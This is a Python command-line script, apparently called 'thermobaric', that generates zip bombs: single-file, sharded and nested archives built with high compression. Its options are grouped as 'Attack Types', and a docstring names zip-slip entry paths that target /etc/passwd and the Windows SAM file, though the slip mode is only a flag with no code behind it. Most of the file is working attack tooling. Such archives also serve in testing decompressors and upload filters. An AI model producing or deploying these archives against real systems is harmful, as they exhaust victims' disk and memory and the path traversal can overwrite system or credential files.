
import zipfile as z
import argparse
import logging
from os import remove
# setup logging info
logger = logging.getLogger("util")
logging.basicConfig(level=logging.INFO, handlers=[
                        logging.FileHandler("thermobaric-dev.log"),
                        logging.StreamHandler()
                    ], format="%(asctime)s || %(levelname)s => %(message)s    ")



# Constants:
GB = 1073741824
MB = 1048576
KB = 1024

'''
 Four types of zip bombs:
    1. A zip file with one large file inside using high compression ratios
    2. A sharded zip file, containing thousands of small(ish) files with high compression ratios
    3. A traditional zip slip, using file names like '../../../../etc/passwd' or '../../../../Windows/System32/config/SAM'
    4. infinite recusion, zip files within zip files within zip files....
'''
def validate_args(args: argparse.Namespace) -> bool:
    if args.outFile == "":
        logger.error("Outfile must be a valid name")
        return False
    if args.compression > 9:
        logger.error("Compression must be between 1 and 9.")
        return False
    size = [x for x in (args.Sb,args.Sk,args.Sm,args.Sg) if x != 0]
    logger.debug(f"validate_args:size is {size}")
    if len(size) > 1:
        logger.error("Cannot have more than one size modifer at a time.")
        logger.debug(f"Found {size}")
        return False
    elif len(size) == 0:
        logger.error("Must have at least one configured size.")
        return False
    mode = [x for x in (args.t, args.recursive, args.shard, args.slip) if x is True]
    logger.debug(f"validate_args:mode is {mode}")
    if len(mode) > 1:
        logger.error("Cannot have more than one mode selected at a time.")
        logger.debug(f"validate_args: Found {mode}")
        return False
    elif len(mode) == 0:
        logger.error("Select a generation mode")
        return False
    return True


def traditional(size: float, name: str, comp=1) -> None:
    to_write = b"X" * size
    logger.info(f"Starting material generation of size {len(to_write)} bytes")
    if len(to_write) > 26843545500:
        logger.warning(f"Writting a file larger than 25Gb, this will consume system resources")
    with z.ZipFile(name,'w',compression=z.ZIP_DEFLATED,compresslevel=comp) as zf:
        zf.writestr(f"bin-{len(to_write)}.dat", to_write)
        logger.info("Material generation Complete")
        zf.close()
    logger.info(f"Zip file: {name} created")

def shard(size: float, name: str, comp=1, number=5) -> None:
    to_write = b"X" * size
    logger.info(f"Starting material generation of size {len(to_write)} bytes")
    if len(to_write) > 26843545500:
        logger.warning(f"Writting a file larger than 25Gb, this will consume system resources")
    with z.ZipFile(name,'w',compression=z.ZIP_DEFLATED,compresslevel=comp) as zf:
        for x in range(0, number):
            zf.writestr(f"shard-{x}.dat", to_write)
            logger.info(f"Wrote shard number {x}")
        zf.close()
    logger.info(f"Zip file: {name} created.")

def recursive(size: float, name: str, comp=1, depth=2):
    """
    file.zip
    |-> level3.zip
    |    |-> large_file3.dat
    |----> level2.zip
    |        |-> large_file2.dat
    |-------->level1.zip
    |            |- large_file1.dat
    """

    to_write = b"X" * size
    logger.info(f"Starting material generation of size {len(to_write)} bytes")
    if len(to_write) > 26843545500:
        logger.warning(f"Writting a file larger than 25Gb, this will consume system resources")
    # static depth for now. need to figure out dynamic
    with z.ZipFile(name, 'w', compression=z.ZIP_DEFLATED, compresslevel=comp) as zf:
        with z.ZipFile('level3.zip','w',compression=z.ZIP_DEFLATED, compresslevel=comp) as l1:
            with z.ZipFile('level2.zip','w',compression=z.ZIP_DEFLATED,compresslevel=comp) as l2:
                with z.ZipFile('level1.zip','w',compression=z.ZIP_DEFLATED,compresslevel=comp) as l3:
                    l3.writestr('data.bin',to_write)
                    l3.close()
                l2.write('level1.zip')
                remove('level1.zip')
                l2.close()
            l1.write('level2.zip')
            remove('level2.zip')
            l1.close()
        zf.write('level3.zip')
        remove('level3.zip')
        zf.close()
    logger.info(f'finished generating file: {name}')
    # with z.ZipFile(name, 'w', compression=z.ZIP_DEFLATED,compresslevel=comp) as zf:
    #     for x in range(0,depth):
    #         print(f"x is {x}")
    #         with z.ZipFile(f"level-{x}.zip", 'w', compression=z.ZIP_DEFLATED,compresslevel=comp ) as inner_zip:
    #             logger.debug(f"now inside level-{x}.zip")
    #             inner_zip.writestr("data.dat", to_write)
    #             logger.debug("Wrote data.dat to zipfile.")
    #             if x == 0:
    #                 print(f"found 0, closing zip")
    #                 inner_zip.close()
    #                 logger.debug("closed inner zip file, x was 0")
    #             else:
    #                 #inner_zip.write(f"level-{(x-1)}.zip")
    #                 inner_zip.close()
    #                 logger.debug("closed inner zip file, x was larger than 0")

    #         logger.debug(f"Outside the with block, now attempting to save level-{x}.zip")
    #         zf.write(f"level-{x}.zip")
    #         logger.debug(f"now cleaning up level-{x}.zip")
    #         remove(f"level-{x}.zip")
    #     zf.close()


def main(args):
    logger.debug(f"found args: {args}")
    if ( validate_args(args) ):
        logger.info(f"Starting")
        if args.t:
            if args.Sb:
                traditional(args.Sb, args.outFile, args.compression)
            elif args.Sk:
                traditional((args.Sk * KB), args.outFile, args.compression)
            elif args.Sm:
                traditional((args.Sm * MB), args.outFile, args.compression)
            else:
                traditional((args.Sg * GB), args.outFile, args.compression)
        elif args.shard:
            if args.Sb:
                shard(args.Sb, args.outFile, args.compression, args.shard_num)
            elif args.Sk:
                shard((args.Sk * KB), args.outFile, args.compression, args.shard_num)
            elif args.Sm:
                shard((args.Sm * MB), args.outFile, args.compression, args.shard_num)
            else:
                shard((args.Sg * GB), args.outFile, args.compression, args.shard_num)
        elif args.recursive:
            if args.Sb:
                recursive(args.Sb, args.outFile, args.compression, args.depth)
            elif args.Sk:
                recursive((args.Sk * KB), args.outFile, args.compression, args.depth)
            elif args.Sm:
                recursive((args.Sm * MB), args.outFile, args.compression, args.depth)
            else:
                recursive((args.Sg * GB), args.outFile, args.compression, args.depth)
            # if args.Sb:
            #     shard(args.Sb, args.outFile, args.compression, args.shard_num)
            # elif args.Sk:
            #     shard((args.Sk * KB), args.outFile, args.compression, args.shard_num)
            # elif args.Sm:
            #     shard((args.Sm * MB), args.outFile, args.compression, args.shard_num)
            # else:
            #     shard((args.Sg * GB), args.outFile, args.compression, args.shard_num)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    attacks = parser.add_argument_group(title="Attack Types", description="Various attack types supported by this tool")
    file_manip = parser.add_argument_group(title="File Modifiers", description="Arguments to modify file structures")
    size_manip = parser.add_argument_group(title="Size Modifiers", description="File size of compressed files.")
    attacks.add_argument("-r","--recursive", help="Generate recursive zip bomb", action="store_true")
    attacks.add_argument("-s","--slip",help="Generate Zip Slip", action='store_true')
    attacks.add_argument("-x","--shard", help="Generate Sharded zip bomb",action='store_true')
    attacks.add_argument("-xn","--shard-num",help="Number of shards to create", type=int)
    attacks.add_argument("-t", help="traditional zip bomb",action='store_true')
    size_manip.add_argument('-Sb', help="file size to compress in bytes", type=int,default=0)
    size_manip.add_argument('-Sk',help="file size to compress in kilobytes", type=int,default=0)
    size_manip.add_argument('-Sm',help="file size to compress in megabytes", type=int,default=0)
    size_manip.add_argument('-Sg',help="file size to compress in gigabytes", type=int,default=0)
    file_manip.add_argument('-c', '--compression', help='Compression level.',type=int,default=1)
    file_manip.add_argument("-f","--outFile",help="Final output filename", type=str, required=True)
    file_manip.add_argument("-d","--depth", help="depth of recursion", type=int)
    args = parser.parse_args()
    main(args)
